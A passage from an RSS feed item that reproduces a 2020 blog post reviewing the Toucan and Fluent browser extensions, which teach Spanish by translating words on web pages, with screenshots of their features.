            <guid isPermaLink="false">hacker-news-small-sites-25055308</guid>
            <pubDate>Wed, 11 Nov 2020 03:46:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning a New Language While Browsing the Web]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25055257">thread link</a>) | @rahulchowdhury
<br/>
November 10, 2020 | https://hulry.com/toucan-learn-language/ | <a href="https://web.archive.org/web/*/https://hulry.com/toucan-learn-language/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
<p>Around 2015, I picked up a hobby of learning a new language — Spanish.</p>



<p>However, after a few months of dedicated learning time, I couldn’t get myself to stick to the hobby.</p>



<p>I had other things to work on, and learning a language was not my priority.</p>



<p>But things have changed now.</p>



<p>In this post, I’ll talk about how I’m learning a bit of Spanish every single day using a new language learning tool called <a href="https://jointoucan.com/" target="_blank" rel="noreferrer noopener">Toucan</a>.</p>



<p>Let’s get started with:</p>



<h2>My experience with various language-learning apps</h2>



<p>I started my Spanish learning journey with the most popular language-learning app — <a href="https://www.duolingo.com/" target="_blank" rel="noreferrer noopener nofollow">Duolingo</a>.</p>



<p>While it was fun initially, I soon found myself missing practice days.</p>



<p>As time passed by, the gap widened. And soon enough, I stopped my Spanish sessions.</p>



<p>In the last few years, I’ve tried to rekindle the Spanish spark in me and continue learning with Duolingo. Still, I never succeeded in sticking to the classes.</p>



<p>Then came <a href="https://www.babbel.com/" target="_blank" rel="noreferrer noopener nofollow">Babbel</a>.</p>



<p>While I must say that Babbel has a better course in terms of learning proper grammar and dialects, it had the same problem as Duolingo:</p>



<p>It was hard for me to dedicate time from my schedule for learning sessions.</p>



<p>My only motivation for learning Spanish was to expand my skill set.</p>



<p>Since I’m not moving to a Spanish speaking country anytime soon, I didn’t feel the need to prioritise this hobby.</p>



<p>But then:</p>



<p>A few months ago, I spotted a new <a href="https://chrome.google.com/webstore/detail/toucan/lokjgaehpcnlmkebpmjiofccpklbmoci" target="_blank" rel="noreferrer noopener nofollow">Chrome extension called Toucan</a>. Around the same time, a similar extension launched called <a href="https://www.usefluent.co/" target="_blank" rel="noreferrer noopener">Fluent</a>.</p>



<p>The key selling point of these new extensions was to learn a new language while browsing the web.</p>



<p>You don’t need to dedicate time for picking up a new language. Club the learning sessions, along with activities we do every day — browsing the web and reading articles online.</p>



<p>After a quick test ride, here’s:</p>



<h2>Why I find language learning extensions interesting</h2>



<p>The first and most immense value — habit bundling.</p>



<p>I had previously talked about how I <a href="https://hulry.com/building-podcasts-habit/" target="_blank" rel="noreferrer noopener">clubbed my habit</a> of making tea every morning with listening to podcasts.</p>



<p>I saw a similar opportunity with these browser extensions.</p>



<p>The biggest hurdle for me in learning Spanish was making time for classes.</p>



<p>Now:</p>



<p>I don’t need to dedicate time out of my daily routine to learn a new language.</p>



<p>I browse and read lots of articles online. With Toucan or Fluent, I can learn and practice Spanish every time I read stuff online.</p>



<p>Here’s:</p>



<h2>How Toucan and Fluent work</h2>



<p>Install Toucan or Fluent, and browse the web as you’d typically do.</p>



<p>These extensions will translate and highlight some words from the page content into the language you’ve chosen.</p>



<p>Hovering over the highlighted word will bring up a popup card like this:</p>



<div><figure><img data-attachment-id="943" data-permalink="https://hulry.com/toucan-learn-language/toucan-translation-demo/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?fit=1646%2C742&amp;ssl=1" data-orig-size="1646,742" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-translation-demo" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?fit=300%2C135&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?fit=1024%2C462&amp;ssl=1" loading="lazy" width="1024" height="462" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;ssl=1" alt="Toucan translating and showing up a word on Instapaper." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=300%2C135&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=768%2C346&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1536%2C692&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1200%2C541&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?w=1646&amp;ssl=1 1646w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=300%2C135&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=768%2C346&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1536%2C692&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1200%2C541&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?w=1646&amp;ssl=1 1646w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-demo.png?resize=1024%2C462&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan translating and showing up a word on Instapaper.</figcaption></figure></div>



<p>Pretty neat. Right?</p>



<p>Apart from the convenience, another thing I like is that the translations are beautifully blended into the content.</p>



<p>For example, from the above screenshot, you can see Toucan seamlessly translated and blended the English word “event” into its Spanish counterpart — evento.</p>



<p>While reading an article, I can see a mixture of English and the language I want to learn.</p>



<p>To know more about the translated word, I can hover on it and Toucan will show me the word in English, with its definition.</p>



<p>I’ve tried both Toucan and Fluent on multiple websites, and they seem to blend in translations flawlessly with the page’s design.</p>



<p>Here’s an article on Forbes with Toucan translations:</p>



<div><figure><img data-attachment-id="947" data-permalink="https://hulry.com/toucan-learn-language/toucan-translation-forbes/" data-orig-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?fit=1474%2C814&amp;ssl=1" data-orig-size="1474,814" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-translation-forbes" data-image-description="" data-medium-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?fit=300%2C166&amp;ssl=1" data-large-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?fit=1024%2C565&amp;ssl=1" loading="lazy" width="1024" height="565" src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;ssl=1" alt="Toucan translating words from an article on Forbes." srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=300%2C166&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=768%2C424&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1200%2C663&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?w=1474&amp;ssl=1 1474w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=300%2C166&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=768%2C424&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1200%2C663&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?w=1474&amp;ssl=1 1474w" data-lazy-src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-forbes.png?resize=1024%2C565&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan translating words from an article on Forbes.</figcaption></figure></div>



<p>Now:</p>



<p>Fluent, however, has a more targeted highlighting than Toucan. </p>



<p>If you’re using Fluent, it’ll highlight words with different colour based on gender.</p>



<div><figure><img data-attachment-id="983" data-permalink="https://hulry.com/toucan-learn-language/fluent-colour-highlights/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?fit=1596%2C508&amp;ssl=1" data-orig-size="1596,508" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fluent-colour-highlights" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?fit=300%2C95&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?fit=1024%2C326&amp;ssl=1" loading="lazy" width="1024" height="326" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;ssl=1" alt="Fluent highlighting words with a different colour." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=300%2C95&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=768%2C244&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1536%2C489&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1200%2C382&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?w=1596&amp;ssl=1 1596w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=300%2C95&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=768%2C244&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1536%2C489&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1200%2C382&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?w=1596&amp;ssl=1 1596w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-colour-highlights.png?resize=1024%2C326&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Fluent highlighting words with a different colour.</figcaption></figure></div>



<p>In the paragraph shown above, Fluent highlighted the word “derrame” with a yellow tint (because it’s masculine), and “incluso” with a neutral grey-ish colour (because it’s gender-neutral).</p>



<p>That said, here are:</p>



<h2>Some features in Toucan that caught my attention</h2>



<p>Trying out both extensions, I chose to stick with Toucan, mainly due to a couple of subtle features.</p>



<p>The first being:</p>



<h3>Word definitions</h3>



<p>Toucan shows up the definition of a translated word on the hovercard that shows up.</p>



<div><figure><img data-attachment-id="952" data-permalink="https://hulry.com/toucan-learn-language/toucan-word-definition/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?fit=1524%2C632&amp;ssl=1" data-orig-size="1524,632" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-word-definition" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?fit=300%2C124&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?fit=1024%2C425&amp;ssl=1" loading="lazy" width="1024" height="425" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;ssl=1" alt="Toucan showing a word's definition." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=300%2C124&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=768%2C318&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1200%2C498&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?w=1524&amp;ssl=1 1524w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=300%2C124&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=768%2C318&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1200%2C498&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?w=1524&amp;ssl=1 1524w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-word-definition.png?resize=1024%2C425&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan showing a word’s definition.</figcaption></figure></div>



<p>As a non-native English speaker, this feature is helpful to me. </p>



<p>If I don’t know the meaning of the translated word, I can read the definition on the card.</p>



<p>There’s one caveat though:</p>



<p>Right now, not all words show up a definition. However, the number of words without a description is low.</p>



<p>Also, the team at Toucan promised they are continuously working on adding more words and definitions to the tool.</p>



<p>Therefore, this caveat should no longer exist pretty soon.</p>



<p>Another feature I found helpful is:</p>



<h3>The ability to mark a word as learnt</h3>



<p>The Toucan hovercard has a little checkmark which lets me mark a word as learnt, like this:</p>



<div><figure><img data-attachment-id="958" data-permalink="https://hulry.com/toucan-learn-language/touch-mark-word-done/" data-orig-file="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?fit=840%2C526&amp;ssl=1" data-orig-size="840,526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="touch-mark-word-done" data-image-description="" data-medium-file="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?fit=840%2C526&amp;ssl=1" loading="lazy" width="840" height="526" src="https://i2.wp.com/hulry.com/wp-content/uploads/2020/11/touch-mark-word-done.gif?resize=840%2C526&amp;ssl=1" alt="Marking a word as known in Toucan." data-recalc-dims="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Marking a word as known in Toucan.</figcaption></figure></div>



<p>What this does is it prevents the word from getting translated in future articles or content.</p>



<p>Since I had taken a couple of Spanish lessons in the past, I marked a handful of words as “I know this” and Toucan will leave those words in the source language — English, for me.</p>



<p>Also:</p>



<p>The Toucan team is working on some recommendation magic for this feature.</p>



<p>For example:</p>



<p>Marking the word “coffee” as learnt will set Toucan to translate tricky words like “hot coffee” or “nice coffee” in your future reads.</p>



<p>This is how I’ll be able to calibrate Toucan to show up more complicated words as I progress in my Spanish learning journey. </p>



<p>Now:</p>



<p>Everyone learns at a different pace.</p>



<p>To make it easy to progress comfortably, Toucan allows me to:</p>



<h3>Select language packs for translation</h3>



<p>Instead of being bombarded with a giant index of Spanish words, Toucan allows me to <a href="https://jointoucan.com/dashboard" target="_blank" rel="noreferrer noopener nofollow">select language packs</a> on the dashboard:</p>



<div><figure><img data-attachment-id="962" data-permalink="https://hulry.com/toucan-learn-language/toucan-language-packs/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?fit=1860%2C1182&amp;ssl=1" data-orig-size="1860,1182" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-language-packs" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?fit=300%2C191&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?fit=1024%2C651&amp;ssl=1" loading="lazy" width="1024" height="651" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;ssl=1" alt="Selecting language packs in Toucan." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=300%2C191&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=768%2C488&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1536%2C976&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1200%2C763&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?w=1860&amp;ssl=1 1860w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=300%2C191&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=768%2C488&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1536%2C976&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1200%2C763&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?w=1860&amp;ssl=1 1860w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-language-packs.png?resize=1024%2C651&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Selecting language packs in Toucan.</figcaption></figure></div>



<p>Each language pack has a set of words that Toucan will search for in an article or web page content and translate.</p>



<p>For example, choosing the language pack “Get Around the City” will set Toucan to translate the following English words in the collection to their Spanish counterparts:</p>



<div><figure><img data-attachment-id="964" data-permalink="https://hulry.com/toucan-learn-language/toucan-get-around-city-pack/" data-orig-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?fit=1420%2C834&amp;ssl=1" data-orig-size="1420,834" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-get-around-city-pack" data-image-description="" data-medium-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?fit=1024%2C601&amp;ssl=1" loading="lazy" width="1024" height="601" src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;ssl=1" alt="Toucan's &quot;Get Around the City&quot; language pack." srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=300%2C176&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=768%2C451&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1200%2C705&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?w=1420&amp;ssl=1 1420w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;ssl=1 1024w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=300%2C176&amp;ssl=1 300w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=768%2C451&amp;ssl=1 768w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1200%2C705&amp;ssl=1 1200w, https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?w=1420&amp;ssl=1 1420w" data-lazy-src="https://i1.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-get-around-city-pack.png?resize=1024%2C601&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Toucan’s “Get Around the City” language pack.</figcaption></figure></div>



<p>This feature is beneficial for beginners because we can choose a handful of language packs and start learning.</p>



<p>Once we have mastered the words in the selected packs, we can remove them from our list and move on to more advanced packs.</p>



<p>So, overall, Toucan seems to be a useful tool for learning a language.</p>



<p>But, here’s a burning question:</p>



<h2>Can language extensions be a distraction?</h2>



<p>It depends on the translation density set for the extension.</p>



<p>For example, in Toucan, we can control the number of translations on a page with the following setting:</p>



<div><figure><img data-attachment-id="967" data-permalink="https://hulry.com/toucan-learn-language/toucan-translation-frequency/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?fit=1600%2C1158&amp;ssl=1" data-orig-size="1600,1158" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="toucan-translation-frequency" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?fit=300%2C217&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?fit=1024%2C741&amp;ssl=1" loading="lazy" width="1024" height="741" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;ssl=1" alt="Choosing a translation density in Toucan." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=300%2C217&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=768%2C556&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1536%2C1112&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1200%2C869&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=300%2C217&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=768%2C556&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1536%2C1112&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1200%2C869&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?w=1600&amp;ssl=1 1600w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/toucan-translation-frequency.png?resize=1024%2C741&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Choosing a translation 